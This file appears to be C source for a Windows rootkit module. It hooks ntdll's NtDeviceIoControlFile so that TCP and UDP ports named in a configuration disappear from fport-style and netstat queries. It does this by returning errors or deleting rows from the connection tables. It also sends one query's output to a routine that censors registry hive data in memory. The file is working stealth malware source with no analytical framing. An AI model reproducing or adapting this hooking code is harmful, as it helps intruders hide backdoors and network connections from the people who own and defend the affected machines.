#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include <iprtrmib.h> // -> using the one from lcc-win32
#include "ntdll.h"

#include "misc.h"
#include "config.h"

#include "ntdeviceiocontrolfile.h"
#include "ntsavekey.h"

// ntdll.NtDeviceIoControlFile
NTSTATUS WINAPI NewNtDeviceIoControlFile
(
  HANDLE               FileHandle,
  HANDLE               Event,
  PIO_APC_ROUTINE      ApcRoutine,
  PVOID                ApcContext,
  PIO_STATUS_BLOCK     IoStatusBlock,
  ULONG                IoControlCode,
  PVOID                InputBuffer,
  ULONG                InputBufferLength,
  PVOID                OutputBuffer,
  ULONG                OutputBufferLength 
)
{
	NTSTATUS rc;
	UNICODE_STRING usTcp,usUdp;
	CHAR pcBuffer[0x100];
	ULONG ulResult=0;

	RtlInitUnicodeString(&usTcp,TCP_DEVICE);
	RtlInitUnicodeString(&usUdp,UDP_DEVICE);

	// call original function
	rc=OldNtDeviceIoControlFile(
			FileHandle,
			Event,
			ApcRoutine,
			ApcContext,
			IoStatusBlock,
			IoControlCode,
			InputBuffer,
			InputBufferLength,
			OutputBuffer,
			OutputBufferLength
			);

	if (NT_SUCCESS(rc))
	{
		// fport,opports on win2k
		if (IoControlCode==CONTROL_FPORT)
		{
			BOOL TCP=TRUE;

			// 256 should be enough for tcp or udp handlename
			RtlZeroMemory(&pcBuffer,0x100);
			
			// get handlename
			NtQueryObject(FileHandle,ObjectNameInformation,&pcBuffer,0x100,&ulResult);

			if (!((POBJECT_NAME_INFORMATION)pcBuffer)->Name.Buffer)
				return rc;

			// check if handle is Tcp or Udp, if not,it's an handle we're not
			// interested in. 
			if (RtlCompareUnicodeString(&((POBJECT_NAME_INFORMATION)pcBuffer)->Name,&usTcp,TRUE)==0)
				TCP=TRUE;
			else if (RtlCompareUnicodeString(&((POBJECT_NAME_INFORMATION)pcBuffer)->Name,&usUdp,TRUE)==0)
				TCP=FALSE;
			else
				return rc;

			if (InputBufferLength==sizeof(TDI_CONNECTION_INFORMATION)) 
			{
				BOOL bFound;
				
				if (((TDI_CONNECTION_INFORMATION*)InputBuffer)->RemoteAddressLength==3 || 
					((TDI_CONNECTION_INFORMATION*)InputBuffer)->RemoteAddressLength==4)
				{
					UINT uiPort=misc_htons(*(USHORT*)((char*)OutputBuffer+12));

					if (TCP) // Tcp or Udp ?
						bFound=config_CheckInt(ConfigHiddenTcpLocal,uiPort);
					else
						bFound=config_CheckInt(ConfigHiddenUdp,uiPort);
					
					if (bFound) // do we need to hide it ? 
					{
						// hide it ! 
						IoStatusBlock->uInformation=0;
						IoStatusBlock->Status=STATUS_INVALID_ADDRESS;
						RtlZeroMemory(OutputBuffer,sizeof(TDI_CONNECTION_INFO));
						OutputBufferLength=0;
						rc=STATUS_INVALID_ADDRESS;
					}
				}
			}
		}
		// netstat, active ports
		else if (IoControlCode==CONTROL_NETSTAT)
		{
			LONG NumRec,Size,Pos,i;
			UCHAR* p=OutputBuffer;
			BOOL TCP=TRUE,bFound=FALSE;
			UINT uiPort;
								
			// 256 should be enough for tcp or udp handlename
			RtlZeroMemory(&pcBuffer,0x100);
			
			// get handlename
			NtQueryObject(FileHandle,ObjectNameInformation,&pcBuffer,0x100,&ulResult);

			if (!((POBJECT_NAME_INFORMATION)pcBuffer)->Name.Buffer)
				return rc;
			
			// check if handle is Tcp or Udp, if not,it's an handle we're not
			// interested in. 
			if (!(RtlCompareUnicodeString(&((POBJECT_NAME_INFORMATION)pcBuffer)->Name,&usTcp,TRUE)==0 ||
				RtlCompareUnicodeString(&((POBJECT_NAME_INFORMATION)pcBuffer)->Name,&usUdp,TRUE)==0))
				return rc;

			// check inputbufferlength
			if (InputBufferLength!=0x24)
				return rc;

			if (((BYTE*)InputBuffer)[1]==0x04 && ((BYTE*)InputBuffer)[17]==0x01) // ROW
			{
				if (((BYTE*)InputBuffer)[16]==0x01) // !_EX
				{
					if (((BYTE*)InputBuffer)[0]==0x00) // TCP
					{
						TCP=TRUE;
						Size=sizeof(MIB_TCPROW);
					}
					else if (((BYTE*)InputBuffer)[0]==0x01) // UDP
					{
						TCP=FALSE;
						Size=sizeof(MIB_UDPROW);
					}
					else
						return rc;
				}
				else if (((BYTE*)InputBuffer)[16]==0x02) // _EX
				{
					if (((BYTE*)InputBuffer)[0]==0x00) // TCP
					{
						TCP=TRUE;
						Size=sizeof(MIB_TCPROW_EX);
					}
					else if (((BYTE*)InputBuffer)[0]==0x01) // UDP
					{
						TCP=FALSE;
						Size=sizeof(MIB_UDPROW_EX);
					}
					else
						return rc;
				}
				else
					return rc;
			
				// get number of ROW structures
				NumRec=IoStatusBlock->uInformation/Size; 
	            if (TCP) Pos=sizeof(DWORD)*2; // position for dwLocalPort -> TCP
				else Pos=sizeof(DWORD); // position for dwLocalPort -> UDP
				
				for (i=0;i<NumRec;i++)
				{
					uiPort=misc_htons(*(USHORT*)((char*)p+Pos));

					if (TCP) // TCP or UDP ?
						bFound=config_CheckInt(ConfigHiddenTcpLocal,uiPort);
					else
						bFound=config_CheckInt(ConfigHiddenUdp,uiPort);

					if (!bFound&&TCP)
					{
						// position for dwRemotePort -> TCP
						uiPort=misc_htons(*(USHORT*)((char*)p+(Pos+(sizeof(DWORD)*2))));
						bFound=config_CheckInt(ConfigHiddenTcpRemote,uiPort);
					}
						
					if (bFound) // hide it !
					{
						RtlCopyMemory(p,p+Size,Size*(NumRec-(i+1))); // hide row
						RtlZeroMemory(p+Size*(NumRec-(i+1)),Size); // delete last row
						OutputBufferLength=OutputBufferLength-Size;
						IoStatusBlock->uInformation=IoStatusBlock->uInformation-Size;
					}
					else 
						p = p + Size; // next
				}
			}
		}
		else if (IoControlCode==CONTROL_KNLSC13)
		{
			CensorRegHiveInMemory(OutputBuffer);
		}
		
	}
	
	return rc;
}